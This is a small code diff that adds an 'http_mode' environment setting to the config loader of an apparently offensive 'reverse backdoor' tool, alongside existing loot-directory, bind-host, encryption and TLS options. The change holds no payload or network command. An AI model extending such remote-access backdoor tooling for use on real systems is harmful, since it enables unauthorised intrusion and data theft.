@@ -37,6 +37,7 @@ def load_config():
     loot_dir = env.get('REVERSE_BACKDOOR_LOOT_DIR') or defaults.get('loot_dir', './loot')
     encryption = env.get('REVERSE_BACKDOOR_ENCRYPTION', '').lower() == 'true'
     tls = env.get('REVERSE_BACKDOOR_TLS', '').lower() == 'true'
+    http_mode = env.get('REVERSE_BACKDOOR_HTTP', '').lower() == 'true'
 
     return {
         'bind_host': bind_host,
@@ -44,4 +45,5 @@ def load_config():
         'loot_dir': loot_dir,
         'encryption': encryption,
         'tls': tls,
+        'http_mode': http_mode,
     }
